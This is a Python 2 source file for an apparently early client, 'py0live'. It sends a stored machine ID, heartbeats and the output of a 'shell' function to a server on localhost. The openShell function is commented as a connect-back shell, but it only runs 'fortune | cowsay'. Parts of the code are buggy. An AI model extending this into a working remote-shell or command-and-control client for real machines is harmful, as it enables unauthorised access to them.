import socket 
import platform
import os
import uuid
import time 
import traceback
import subprocess

VERSION = '0.1.1'

def send(status, data):

	TCP_IP = '127.0.0.1'
	TCP_PORT = 4069
	BUFFER_SIZE = 1024

	while 1:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((TCP_IP, TCP_PORT))
			s.send(protocolFromat(status, data))
			break 
		except:
			traceback.print_last()
			print 'Connection refused sleeping 5...'
			time.sleep(5)

	server_responce = s.recv(BUFFER_SIZE)

	#s.close()

	print "Server responce: ", server_responce
	# Testing server keep alive
	s.send('hello1')
	time.sleep(1)
	s.send('hello2')

			

def getID():

	if os.path.isfile("IDF"):
		f = open("IDF", 'r')
		reading = f.readline()
		return str(reading)
	else:
		f = open("IDF", 'w')
		ident = uuid.uuid4()
		f.write(str(ident))
		return str(ident)

def getOS():
	try:
		return os.name(), platform.release()
	except:
		return -1

def openShell():
	# Opens a shell and connects back to host.
	proc2 = subprocess.Popen('fortune | cowsay', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc2.stdout.read() + proc2.stderr.read()
	args = stdout_value 
	server_SHELL(args)

def timeNow():
	return int(round(time.time() * 1000))

def protocolFromat(status, data):
	# See py0live_protocol_documentation.txt
	protocol = "%s:%s:%s:%s:%s:%s" % (timeNow(), getID(), VERSION, 'c', status, data)
	return str(protocol)

def server_HANDSHAKE():
	# See py0live_protocol_documentation.txt
	send('50', '0')

def sever_HEARTBEAT():
	# See py0live_protocol_documentation.txt
	send('100', '0')

def server_SHELL(shell):
	# See py0live_protocol_documentation.txt
	send('66', shell)


